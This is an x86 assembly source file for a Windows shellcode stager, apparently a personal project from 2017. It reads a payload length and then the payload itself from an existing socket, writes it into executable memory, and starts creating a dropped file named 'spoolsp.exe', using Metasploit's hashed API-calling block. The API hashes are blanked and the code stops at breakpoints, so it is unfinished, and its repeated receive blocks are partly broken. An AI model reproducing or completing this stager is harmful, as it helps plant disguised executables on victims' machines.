#################################
#  x86 Assembly shell           #
#  Created by John Lavery       #
#  Year of 2017                 #
#  Written in x86 assembly code #
#################################

[bits 32]						; defines x86
;Hashes of functions
%define Rec 0x0000000
%define VirtAll 0x0000000
%define Createf 0x0000000
%define Writef 0x00000000
%define Close 0x0000000
%define ShellExe 0x000000 

struc VARS
	.socket		resd	1
	.pBuf		resd	1
	.PayloadSize	resd	1
	.size:
endstruc

	int3
  
;clears stack
	pushad
	pushfd
	cld
  
;Init the stack
	push	ebp
	mov	ebp, esp
	sub	esp, VARS.size ; size of local variables

;Rec <-- receive 4 byte length indicating payload size
	push	0x0					;Flags
	push	0x4					;len
	lea	ebx, [ebp - VARS.PayloadSize]		;location on how many bytes sent
	push	ebx					;pushes the pointer of the buf on the stack
	mov	ecx, dword [ebp + 0x84c]		;sock des
	push	ecx					;pushes the sock des on stack
	push	Rec					;pushes rec hash onto stack
	call	api_call				;calls rec func

;VirtAll <-- allocate enough space to hold entire payload
	push	0x40					;protect
	push	0x3000					;allocation type	
	;mov     eax, VARS.PayloadSize			;dwSize
	mov	ebx, [ebp - 8]				;pushing dwSize onto the stack
	push 	ebx
	push	0x0					;address of region to allocate(NULL)
	push	VirtAll					;pushes VirtAll hash onto the stack
	call	api_call				;calls VirtAll func
	mov	[ebp - VARS.pBuf], eax

;Rec <-- receive entire payload into allocated memory
	push	0x0					;Flags
	mov	ebx, [ebp - 8]				;len
	push	ebx
	;mov	ecx, [ebp - VARS.pBuf]			;ptr to the buf
	push 	eax					;pushes buf
	mov	ecx, dword [ebp + 0x84c]		;sock des
	push	ecx					;pushes the sock des on stack
	push	Rec					;pushes rec hash onto stack
	call	api_call				;calls rec func

;Rec <-- receive entire payload into allocated memory
	push	0x0					;Flags
	mov	ebx, [ebp - 8]				;len
	push	ebx
	mov	ecx, [ebp - VARS.pBuf]			;ptr to the buf
	add	ecx, eax
	push 	ecx					;pushes buf
	mov	ecx, dword [ebp + 0x84c]		;sock des
	push	ecx					;pushes the sock des on stack
	push	Rec					;pushes rec hash onto stack
	call	api_call				;calls rec func

;Rec <-- receive entire payload into allocated memory
	push	0x0					;Flags
	mov	ebx, [ebp - 8]				;len
	push	ebx
	mov	ecx, [ebp - VARS.pBuf]			;ptr to the buf
	add	ecx, eax
	push 	ecx					;pushes buf
	mov	ecx, dword [ebp + 0x84c]		;sock des
	push	ecx					;pushes the sock des on stack
	push	Rec					;pushes rec hash onto stack
	call	api_call				;calls rec func

;Createf
	push	0x0					;NULL - Template file
	push	0x2					;File Attr flag
	push	0x2					;Creation dist
	push	0x0					;sec attri - NULL
	push	0x0					;share mode - NULL
	push	0000000				;desired access
	push	0000000 				;filename "C:\\Desktop\\spoolsp.exe"
 	push	Createf					;pushes Createf hash onto the stack
	call	api_call				;calls CreateFile func

	int3						;break
	int3						;break
	int3						;break
	int3						;break
	int3						;break
	

%include "blockapii.asm"				;incudes metasploit block api py script
